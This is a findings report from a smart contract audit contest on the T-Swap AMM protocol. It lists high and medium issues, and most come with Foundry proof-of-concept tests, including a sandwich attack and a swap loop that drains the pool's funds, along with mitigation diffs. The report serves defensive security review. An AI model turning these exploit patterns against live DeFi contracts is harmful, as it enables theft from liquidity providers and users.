# First Flight #18: T-Swap - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01.  Incorrect Fee Factor in getInputAmountBasedOnOutput Calculation](#H-01)
    - [H-02. The `TSwapPool::swapExactOutput` Misses Input and Check for `maxInputAmount` ](#H-02)
    - [H-03. Incorrect return function implemented for `TSwapPool::sellPoolTokens` causes user to receive incorrect amount of weth and incorrect amount of pool token being deducted after sell transaction](#H-03)
    - [H-04. `TSwapPool::_swap` incentive breaks the protocol invariant of x \* y = k and allows draining the contract](#H-04)
    - [H-05. Frontrun initial deposit to inflate poolToken price](#H-05)
- ## Medium Risk Findings
    - [M-01. `TSwapPool::deposit` is missing deadline check, causing transactions to complete even after the deadline](#M-01)
    - [M-02. Fee on transfer tokens will break the X * Y = K invariant on TSWAP](#M-02)
    - [M-03. Rebasing Tokens will break TSWAP invariant X*Y = K](#M-03)
    - [M-04. The initial deposit can be frontrunned to grief the pool making it useless](#M-04)
    - [M-05. The `TSwapPool::swapExactOutput` uses Hardcoded block.timestamp as deadline instead of getting it as input](#M-05)
- ## Low Risk Findings
    - [L-01. `TSwapPool::swapExactInput` don't return the output amount](#L-01)
    - [L-02. Incorrect Values Emitted in LiquidityAdded Event](#L-02)
    - [L-03. Steal funds with malicious ERC20](#L-03)
    - [L-04. Hardcoded decimal value leads to incorrect conversion when ERC20 does not use 18 decimals.](#L-04)
    - [L-05.  Missing Rounding in getInputAmountBasedOnOutput Calculation](#L-05)
    - [L-06. The `PoolFactory` contract wont work with tokens like MKR which have bytes32 `name` and `symbol`](#L-06)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #18

### Dates: Jun 20th, 2024 - Jun 27th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-06-t-swap)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 5
   - Medium: 5
   - Low: 6


# High Risk Findings

## <a id='H-01'></a>H-01.  Incorrect Fee Factor in getInputAmountBasedOnOutput Calculation

_Submitted by [maikelordaz](/profile/cltpyvz0u0000f3xerby0tpdw), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [sheep](/profile/clwzyccte00009ky8t4ft529d), [Batman](/profile/clkc47fv10006l908u64cn5ef), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [passandscore](/profile/clwgevlj50016i1wzeoa7n01d), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [BadalSharma](/profile/clqr9x7ok0000xj22sa1owbxb), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [mishraji874](/profile/cltepemz50000ouhs442ophcm), [0x1912](/profile/clumv78j80003i5grvm92bhw4), [AndiR16](/profile/clv7o7pe20003yy14w4z60xpi), [ThomasHeim](/profile/clqbwkc6h0000soy0ixbne8xa), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [BarneyEtherGuardian](/profile/clxojwzvm0006yw896egv0ru7), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [talha77](/profile/clr23lcix000li3bvc5j70fy8), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [soupy0x6138](/profile/clxtrdlee0002mh58dhdplsq9), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [jenniferSun](/profile/clsb1ozmi0000unx8zvm2lx40), [swapnaliss](/profile/clxwv1fpq00178s1krjvigqqr), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8), [fjodor](/profile/clxwg4kaz0001103tpyhvtewu), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [kildren](/profile/clxmmb9g7000010aw9we896mw), [0xsalami](/profile/clt01df3800035pfctlu2xr0m), [Enchev](/profile/clvuhiie70000behfon10s33j). Selected submission by: [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol#L280

## Summary
The getInputAmountBasedOnOutput function incorrectly uses a fee factor of 10000 instead of the intended 1000 when calculating the input amount required to obtain a specific output amount. This discrepancy can lead to significant overestimation of the required input amount, causing users to provide more input tokens than necessary.

## Vulnerability Details
In automated market makers (AMMs) like Uniswap, the correct fee factor is typically derived from the transaction fee structure. For example, with a 0.3% fee, the correct multiplier would be 997 out of 1000. Using a factor of 10000 instead of 1000 significantly distorts the input amount calculations.

```solidity
 function getInputAmountBasedOnOutput(
        uint256 outputAmount,
        uint256 inputReserves,
        uint256 outputReserves
    )
        public
        pure
        revertIfZero(outputAmount)
        revertIfZero(outputReserves)
        returns (uint256 inputAmount)
    {
@>        return (inputReserves * outputAmount * 10000) / ((outputReserves - outputAmount) * 997);
    }
```

## POC

```solidity
  function testFeeFactor() public {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 200e18);
        poolToken.approve(address(pool), 200e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));

        assertEq(pool.balanceOf(liquidityProvider), 100e18);
        assertEq(weth.balanceOf(liquidityProvider), 100e18);
        assertEq(poolToken.balanceOf(liquidityProvider), 100e18);

        assertEq(weth.balanceOf(address(pool)), 100e18);
        assertEq(poolToken.balanceOf(address(pool)), 100e18);

        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));

        assertEq(pool.balanceOf(liquidityProvider), 200e18);
        assertEq(weth.balanceOf(liquidityProvider), 0);

        uint256 expected =
            pool.getInputAmountBasedOnOutput(10e18, weth.balanceOf(address(pool)), poolToken.balanceOf(address(pool)));

        // assertion will fail because expected result is 105579897587499340125 (105e18)
        // this is because of the wrong fee factor 10000 used in the calculation
        // the correct fee factor to be used is 1000
        assert(expected <= 10e18);

        vm.stopPrank();
    }
```

## Impact
1. User Overpayment: Users will overpay for their trades, resulting in a much less favorable exchange rate.
2. Market Inefficiency: The incorrect calculations can lead to substantial inefficiencies in the liquidity pool, affecting the overall trading experience.


## Tools Used
Manual Review

## Recommendations
1. Correct Fee Factor: Update the getInputAmountBasedOnOutput function to use the correct fee factor of 1000 instead of 10000.
2. Review and Testing: Conduct thorough reviews and tests of all functions that involve fee calculations to ensure accuracy.

```diff
function getInputAmountBasedOnOutput(
        uint256 outputAmount,
        uint256 inputReserves,
        uint256 outputReserves
    )
        public
        pure
        revertIfZero(outputAmount)
        revertIfZero(outputReserves)
        returns (uint256 inputAmount)
    {
-        return (inputReserves * outputAmount * 10000) / ((outputReserves - outputAmount) * 997);
+        return (inputReserves * outputAmount * 1000) / ((outputReserves - outputAmount) * 997);
    }

```
## <a id='H-02'></a>H-02. The `TSwapPool::swapExactOutput` Misses Input and Check for `maxInputAmount` 

_Submitted by [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Batman](/profile/clkc47fv10006l908u64cn5ef), [sheep](/profile/clwzyccte00009ky8t4ft529d), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [passandscore](/profile/clwgevlj50016i1wzeoa7n01d), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [BadalSharma](/profile/clqr9x7ok0000xj22sa1owbxb), [mishraji874](/profile/cltepemz50000ouhs442ophcm), [ThomasHeim](/profile/clqbwkc6h0000soy0ixbne8xa), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [talha77](/profile/clr23lcix000li3bvc5j70fy8), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [soupy0x6138](/profile/clxtrdlee0002mh58dhdplsq9), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [jenniferSun](/profile/clsb1ozmi0000unx8zvm2lx40), [swapnaliss](/profile/clxwv1fpq00178s1krjvigqqr), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [0xjarix](/profile/clmjdxnit0000mo08j0t9g44h), [kildren](/profile/clxmmb9g7000010aw9we896mw). Selected submission by: [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol

### [H-03] The `TSwapPool::swapExactOutput` Misses Input and Check for `maxInputAmount` 

**Description:**
The `swapExactOutput` function lacks a slippage control input parameter, which is essential for protecting users from price fluctuations that could occur between the time they submit a transaction and when it gets executed.

```javascript
 function swapExactOutput(
        IERC20 inputToken,
        IERC20 outputToken,
        uint256 outputAmount,
        uint64 deadline
@>      ???        
    )
        public
        revertIfZero(outputAmount)
        revertIfDeadlinePassed(deadline)
        returns (uint256 inputAmount)
    {
        uint256 inputReserves = inputToken.balanceOf(address(this));
        uint256 outputReserves = outputToken.balanceOf(address(this));

        inputAmount = getInputAmountBasedOnOutput(
            outputAmount,
            inputReserves,
            outputReserves
        );

        _swap(inputToken, inputAmount, outputToken, outputAmount);
    }
```

**Impact:**
The absence of a check for `maxInputAmount` in the `swapExactOutput` method makes it vulnerable to Miner Extractable Value (MEV) attacks. An MEV bot could sandwich any transaction made by this function to gain incentives at the expense of the user. This vulnerability allows attackers to manipulate the price seen by the victim's transaction, forcing them to pay more than they initially intended.

**Proof of Concept:**
A simple test demonstrates the possibility of sandwich attacks due to the lack of slippage control:

```javascript
function testSwapExactOutputSandwichAttack() public {
        attacker = makeAddr("attacker");
        poolToken.mint(attacker, 100e18);
        vm.startPrank(attacker);
        poolToken.approve(address(pool), 100e18);
        weth.approve(address(pool), 24962443665498247371);
        // poolToken.mint(user, 10e18);
        //liquidity deposit:
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 200e18);
        poolToken.approve(address(pool), 200e18);
        pool.deposit(50e18, 50e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        //user wants to swap
        vm.prank(user);
        poolToken.approve(address(pool), 10e18);
        // currently there is 100e18 WETH and 50e18 PT in pool
        // we want to swap x poolToken for 1e18 WETH
        // x considering fees would be = 2_046_957_198_124_987_206
        uint256 expected = 2_046_957_198_124_987_206;
        //here an attacker swaps poolToken for weth by frontrunning user,
        vm.prank(attacker);
        pool.swapExactInput(
            poolToken,
            100e18,
            weth,
            0,
            uint64(block.timestamp)
        );

        vm.prank(user);
        uint256 actual = pool.swapExactOutput(
            poolToken,
            weth,
            1e18,
            uint64(block.timestamp)
        );
        //here the attacker swaps weth for PT,
        vm.startPrank(attacker);
        pool.swapExactInput(
            weth,
            weth.balanceOf(attacker),
            poolToken,
            0,
            uint64(block.timestamp)
        );

        assert(actual > expected);
        assert(weth.balanceOf(attacker) >= 0);
        assert(poolToken.balanceOf(attacker) > 100e18); // attacker had 0 weth and 100e18 PT initially check if he has more now
        // ans. 105_982_517_697_077_211_812 i.e. attacker gained 5.98 e18 PT by doing this
    }
```
**Recommended Mitigation:**
Introduce slippage control by adding a `maxInputAmount` parameter to the function. This parameter will allow users to specify the maximum amount they are willing to pay for the output tokens, thereby protecting them from excessive price movements caused by MEV attacks.

```diff
+     error TSwapPool__OutputTooHigh(uint256 actual, uint256 max);

      function swapExactOutput(
              IERC20 inputToken,
              IERC20 outputToken,
              uint256 outputAmount,
+             uint256 maxInputAmount,
              uint64 deadline
          )
              public
              revertIfZero(outputAmount)
              revertIfDeadlinePassed(deadline)
              returns (uint256 inputAmount)
          {
              uint256 inputReserves = inputToken.balanceOf(address(this));
              uint256 outputReserves = outputToken.balanceOf(address(this));  
              inputAmount = getInputAmountBasedOnOutput(
                  outputAmount,
                  inputReserves,
                  outputReserves
              );
+             if (inputAmount > maxInputAmount){
+                 revert TSwapPool__OutputTooHigh(inputAmount,maxInputAmount)
+             }  
              _swap(inputToken, inputAmount, outputToken, outputAmount);
    }
```
## <a id='H-03'></a>H-03. Incorrect return function implemented for `TSwapPool::sellPoolTokens` causes user to receive incorrect amount of weth and incorrect amount of pool token being deducted after sell transaction

_Submitted by [maikelordaz](/profile/cltpyvz0u0000f3xerby0tpdw), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Batman](/profile/clkc47fv10006l908u64cn5ef), [sheep](/profile/clwzyccte00009ky8t4ft529d), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [passandscore](/profile/clwgevlj50016i1wzeoa7n01d), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [BadalSharma](/profile/clqr9x7ok0000xj22sa1owbxb), [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [mishraji874](/profile/cltepemz50000ouhs442ophcm), [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8), [ThomasHeim](/profile/clqbwkc6h0000soy0ixbne8xa), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [soupy0x6138](/profile/clxtrdlee0002mh58dhdplsq9), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [jenniferSun](/profile/clsb1ozmi0000unx8zvm2lx40), [swapnaliss](/profile/clxwv1fpq00178s1krjvigqqr), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [fjodor](/profile/clxwg4kaz0001103tpyhvtewu). Selected submission by: [soupy0x6138](/profile/clxtrdlee0002mh58dhdplsq9)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/d1783a0ae66f4f43f47cb045e51eca822cd059be/src/TSwapPool.sol#L363-L373

## Summary
The function `TSwapPool::sellPoolTokens` is used by user to sell the pool token in exchange of weth. User inputs the amount of pool token he intends to sell and the function will calculate the weth that he will get in return. However, `TSwapPool::sellPoolTokens` wrongly implement the return function `swapExactOutput` resulting incorrect amount of weth paid to user and incorrect amount of pool token being deducted from user account after the sell transaction

## Vulnerability Details
According to the natspec, `TSwapPool::sellPoolTokens` is used to facilitate users selling pool tokens in exchange of weth. However, `TSwapPool::sellPoolTokens` implements wrong function `swapExactOutput` to calculate the weth amount user should get after the user inputs the amount of pool token he intends to sell. The correct return value should be calculated through function `swapExactInput` instead

<details>
<summary>Proof of Concept</summary>

Place the following test case in `test/unit/TSwapPool.t.sol` : 

** Prerequisite: 
In contract `TswapPool`, correct back another audit finding ( change 10000 to 1000) on `getInputAmountBasedOnOutput` under the `swapExactOutput`, so that we only test `swapExactOutput` validity in the `sellPoolToken` function and not influenced by the error caused by other factor.

```javascript

function testSellPoolTokenReturnValues() public {
        // injecting funds into pool by liquidity provider
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        // starting pranking that a user want to sell his pool token
        vm.startPrank(user);
        uint256 balanceWethB4Sell = weth.balanceOf(user); // will return 10e18 as minted in setUp
        uint256 balancePoolTokenB4Sell = poolToken.balanceOf(user); // will return 10e18 as minted in setUp
        console.log("balance weth_user before sell: ", balanceWethB4Sell);
        console.log("balance poolToken_user before sell: ", balancePoolTokenB4Sell);

        poolToken.approve(address(pool), 10e18);

        // assuming user only want to sell 1e16 poolToken out of his original poolToken amount of 10e18
        uint256 poolTokenAmountToSell = 1e16;
        console.log("poolTokenAmountToSell: ", poolTokenAmountToSell);

        // Prerequisite: correct back another audit finding ( change 10000 to 1000) on `getInputAmountBasedOnOutput` under the `swapExactOutput`, so that we only test `swapExactOutput` validity in the `sellPoolToken` function and not influenced by the error caused by other factor.
        // As formulated in `getInputAmountBasedOnOutput`, calculatedWethToReceive = ((100e18 * 1e16) * uint256(1000)) / ((100e18 - 1e16) * uint256(997)) which factor in the fee charged by the protocol
        uint256 calculatedWethToReceive = pool.sellPoolTokens(poolTokenAmountToSell);
        console.log("calculatedWethToReceive: ", calculatedWethToReceive);

        // check balance after the sell transaction
        uint256 balanceWethAfterSell = weth.balanceOf(user);
        uint256 balancePoolTokenAfterSell = poolToken.balanceOf(user);

        // tapout the expected balance of weth and poolToken after the sell
        // factoring in the fee charged by protocol for the execution of the transaction
        uint256 expectedBalanceWethAftSell = balanceWethB4Sell + calculatedWethToReceive;
        uint256 expectedBalancePoolTokenAftSell = balancePoolTokenB4Sell - poolTokenAmountToSell;

        console.log("balanceWethAfterSell: ", balanceWethAfterSell);
        console.log("expectedBalanceWethAftSell: ", expectedBalanceWethAftSell);

        console.log("balancePoolTokenAfterSell: ", balancePoolTokenAfterSell);
        console.log("expectedPoolTokenBalanceAftSell: ", expectedBalancePoolTokenAftSell);

        assertEq(balanceWethAfterSell, expectedBalanceWethAftSell);
        assertEq(balancePoolTokenAfterSell, expectedBalancePoolTokenAftSell);
    }

```
</details>


The test above will fail indicating that the currect implementation of `swapExactOutput` in `TSwapPool::sellPoolTokens` is wrong. However if we change the return function from `swapExactOutput` to `swapExactInput` with the correct corresponding input parameters and return variable, the test above will pass.

## Impact
User will receive an incorrect amount of weth and also will have incorrect amount of pool token being deducted as the result of the execution of `TSwapPool::sellPoolTokens` with wrong return function implemented

## Tools Used
Manual review and test case

## Recommendations
Make correction to the return function used in `TSwapPool::sellPoolTokens`

```diff

    function sellPoolTokens(
        uint256 poolTokenAmount,
+      uint256 minOutputAmount,
    ) external returns (uint256 wethAmount) {
        return
-           swapExactOutput(
-               i_poolToken,
-               i_wethToken,
-               poolTokenAmount,
-               uint64(block.timestamp)
-           );

+           swapExactInput(
+               i_poolToken,
+               poolTokenAmount,
+               i_wethToken,
+               minOutputAmount,
+               uint64(block.timestamp)
+           );
    }
```
## <a id='H-04'></a>H-04. `TSwapPool::_swap` incentive breaks the protocol invariant of x \* y = k and allows draining the contract

_Submitted by [maikelordaz](/profile/cltpyvz0u0000f3xerby0tpdw), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Batman](/profile/clkc47fv10006l908u64cn5ef), [sheep](/profile/clwzyccte00009ky8t4ft529d), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [passandscore](/profile/clwgevlj50016i1wzeoa7n01d), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8), [mishraji874](/profile/cltepemz50000ouhs442ophcm), [0x1912](/profile/clumv78j80003i5grvm92bhw4), [ThomasHeim](/profile/clqbwkc6h0000soy0ixbne8xa), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [BarneyEtherGuardian](/profile/clxojwzvm0006yw896egv0ru7), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [soupy0x6138](/profile/clxtrdlee0002mh58dhdplsq9), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [jenniferSun](/profile/clsb1ozmi0000unx8zvm2lx40), [swapnaliss](/profile/clxwv1fpq00178s1krjvigqqr), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [fjodor](/profile/clxwg4kaz0001103tpyhvtewu), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [Enchev](/profile/clvuhiie70000behfon10s33j). Selected submission by: [lulox](/profile/clk7oytas000wme08y4yvo0tp)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol#L400

## Summary

The following block of code is responsible for the issue:

```javascript
swap_count++;
if (swap_count >= SWAP_COUNT_MAX) {
  swap_count = 0;
  outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
}
```

An attacker could drain the tokens from both pools by getting this incentive with low value transactions. 

Also, the protocol follows a strict invariant of `x * y = k` (plus fees). Where:

- `x` is the amount of the pool token
- `y` is the amount of the WETH token
- `k` is the constant product of the two balances

This means that whenever the balances change in the protocol, the ratio between the two amounts should remain constant, hence the `k`. However, this is broken due to the extra incentive in the `_swap` function. Meaning that over time, the procotol funds will be drained.

## Impact

A user could maliciously drain the protocol of funds by doing a lot of swaps and collecting the extra incentive given out by the protocol.

## Proof of Concept:

1. A user swaps 10 times, and collects the extra incentive of `1_000_000_000_000_000_000` tokens
2. The user continues to swap until all the protocol funds are drained

<details>
<summary>Draining contract Proof of Code</summary>

```javascript
 function testSwapCountAllowsDrainingTheContract() public {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 10e18);
        poolToken.approve(address(pool), 10e18);
        pool.deposit(10e18, 10e18, 10e18, uint64(block.timestamp));
        vm.stopPrank();

        address attacker = makeAddr("attacker");
        weth.mint(attacker, 1e18);
        poolToken.mint(attacker, 1e18);

        vm.startPrank(attacker);
        poolToken.approve(address(pool), 1e18);
        weth.approve(address(pool), 1e18);
        for (uint256 i = 0; i < 90; i++) {
            pool.swapExactInput(poolToken, 1e15, weth, 0, uint64(block.timestamp));
        }
        for (uint256 i = 0; i < 90; i++) {
            pool.swapExactInput(weth, 1e15, poolToken, 0, uint64(block.timestamp));
        }
        vm.stopPrank();

        // Attacker ends with more than intended, and pool gets drained of its funds
        assert(poolToken.balanceOf(attacker) > 9e18);
        assert(weth.balanceOf(attacker) > 9e18);
        assert(weth.balanceOf(address(pool)) < 2e18);
        assert(poolToken.balanceOf(address(pool)) < 2e18);
    }

```

</details>

<details>
<summary>Invariant Break Proof of Code</summary>

```javascript

 function testInvariantBreak() public {
        // Liquidity provider adds liquidity to the pool
        testDeposit();

        vm.startPrank(user);
        poolToken.approve(address(pool), type(uint256).max);
        poolToken.mint(user, 100e18);
        // We call swap 9 times to increase the swap_count
        uint256 outputWeth = 1e17;
        for (uint256 i = 0; i < 9; i++) {
            pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
        }

        int256 startingY = int256(weth.balanceOf(address(pool)));
        int256 expectedDeltaY = int256(-1) * int256(outputWeth);
        // The 10th swap gets the incentive and breaks the invariant
        pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
        vm.stopPrank();

        uint256 endingY = weth.balanceOf(address(pool));
        int256 actualDeltaY = int256(endingY) - int256(startingY);

        assert(actualDeltaY != expectedDeltaY);
    }

```

</details>

## Tools Used

Foundry and manual review

## Recommendations

 Remove the extra incentive mechanism.

```diff
-    uint256 private swap_count = 0;
-    uint256 private constant SWAP_COUNT_MAX = 10;
.
.
.
-      swap_count++;
-        if (swap_count >= SWAP_COUNT_MAX) {
-            swap_count = 0;
-            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
-        }
```
## <a id='H-05'></a>H-05. Frontrun initial deposit to inflate poolToken price

_Submitted by [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [jenniferSun](/profile/clsb1ozmi0000unx8zvm2lx40). Selected submission by: [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge)._      
            
### Relevant GitHub Links

https://github.com/agent3bood/2024-06-t-swap/blob/main/test/audit/6.t.sol

## Summary

Initial deposit can be frontrun by attacker and deposit some amount of weth and low amount of poolToken, this will bring the price of the poolToken too high depending on how much the attacker deposited.

## Vulnerability Details

The deposit function does not care if the initial depositor is depositing any amount of poolToken and rewards the depositor with LP tokens that are equal to the weth deposited. The price of tokens depends on the initial deposit percent only.


## Impact

Attacker can manipulate the price in the pool and take advantage of the initial price to buy high amount of weth for a low amount of poolToken.


## Tools Used

Unit test.


## Recommendations

In the initial deposit, check if the deposited amounts are not zero. 
Use price oracle to force the initial deposit to match the actual price in other pools.


# Medium Risk Findings

## <a id='M-01'></a>M-01. `TSwapPool::deposit` is missing deadline check, causing transactions to complete even after the deadline

_Submitted by [sheep](/profile/clwzyccte00009ky8t4ft529d), [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [maikelordaz](/profile/cltpyvz0u0000f3xerby0tpdw), [rabuawad](/profile/clxow97ie0003das7vwbu4yvt), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Batman](/profile/clkc47fv10006l908u64cn5ef), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [0xjarix](/profile/clmjdxnit0000mo08j0t9g44h), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [passandscore](/profile/clwgevlj50016i1wzeoa7n01d), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [Ryan](/profile/clp6urvju0000m5zhf5bnawgm), [BadalSharma](/profile/clqr9x7ok0000xj22sa1owbxb), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [mishraji874](/profile/cltepemz50000ouhs442ophcm), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [0x1912](/profile/clumv78j80003i5grvm92bhw4), [edsardgrisel](/profile/cltitj8pl0000ruev9oot7rnk), [ThomasHeim](/profile/clqbwkc6h0000soy0ixbne8xa), [rangappa](/profile/clxc4vyfn000a415fjwungxrc), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [preslavxyz](/profile/clxvlkgdd0006g4l447xhq89d), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [talha77](/profile/clr23lcix000li3bvc5j70fy8), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [soupy0x6138](/profile/clxtrdlee0002mh58dhdplsq9), [jenniferSun](/profile/clsb1ozmi0000unx8zvm2lx40), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [BlockBuddy19](/profile/clxbb1f390001mim8kz8snzth), [swapnaliss](/profile/clxwv1fpq00178s1krjvigqqr), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [fjodor](/profile/clxwg4kaz0001103tpyhvtewu), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [iamthesvn](/profile/clwq0jvk500002bu6kde6smv1). Selected submission by: [lulox](/profile/clk7oytas000wme08y4yvo0tp)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol#L117

## Summary

The deposit function accepts a deadline parameter, which according to the natspec is "The deadline for the transaction to be completed by". However, this parameter is never used. As a consequence, operations that add liquidity to the pool might be executed at unexpected times, in market conditions where the deposit rate is unfavorable.

## Impact

The `deadline` parameter is unused. Transactions could be sent when market conditions are unfavorable (due to a MEV attack or regular usage) to deposit, even when adding a deadline parameter.

## Proof of Concept

Include this test in `TSwapPool.t.sol`:

```javascript
 function testDepositIsMissingADeadlineCheck() public {
        // Liquidity provider adds liquidity to the pool
        testDeposit();

        // The user specifies a max deadline for the deposit to happen
        uint64 deadline = uint64(block.timestamp + 5 minutes);
        // The transaction stays pending longer than specified in the deadline parameter and goes through
        vm.warp(block.timestamp + 30 minutes);
        // We assert than the current block.timestamp is greater than the deadline
        assert(block.timestamp > deadline);

        vm.startPrank(user);
        poolToken.approve(address(pool), 1e18);
        weth.approve(address(pool), 1e18);
        // The user tries to deposit with a deadline in the past
        uint256 liquidityTokensMinted = pool.deposit(1e18, 1e18, 1e18, deadline);

        // Deposit goes through even though the deadline has passed, and liquidity tokens are minted
        assert(liquidityTokensMinted > 0);
    }
```

## Tools Used

Foundry and manual review

## Recommendations

Consider making the following change to the function.

```diff
    function deposit(
        uint256 wethToDeposit,
        uint256 minimumLiquidityTokensToMint,
        uint256 maximumPoolTokensToDeposit,
        uint64 deadline
    )
        external
        revertIfZero(wethToDeposit)
+        revertIfDeadlinePassed(deadline)
        returns (uint256 liquidityTokensToMint)
```
## <a id='M-02'></a>M-02. Fee on transfer tokens will break the X * Y = K invariant on TSWAP

_Submitted by [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [jenniferSun](/profile/clsb1ozmi0000unx8zvm2lx40), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25). Selected submission by: [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol

## Summary
TSWAP protocol relies on maintaining a constant product invariant for its liquidity pools. The invariant formula, 𝑥⋅𝑦=𝑘 , where 
𝑥 and 𝑦 are the reserves of two tokens in the pool, ensures balanced trading and liquidity provision. Tokens that implement a fee on transfer mechanism can disrupt this invariant, leading to potential issues within the protocol.

## Vulnerability Details
Fee on transfer tokens impose a fee whenever they are transferred between addresses. This means that the amount of tokens sent is not equal to the amount of tokens received. When such tokens are used within TSWAP pools, the constant product invariant x⋅y=k no longer holds due to the reduced token amount post-transfer.

For example, if a token with a 1% transfer fee is involved, transferring 100 tokens will result in only 99 tokens being received. This discrepancy breaks the TSWAP invariant, causing the liquidity pool to miscalculate reserves and leading to imbalanced pools.

## Impact
Incorrect Pricing: The pool will miscalculate token prices due to incorrect reserve balances, leading to potentially unfair trades and arbitrage opportunities.

Liquidity Provider Losses: Liquidity providers might incur unexpected losses as their share of the pool's value can decrease due to the miscalculation.

## Proof of Concept (PoC):
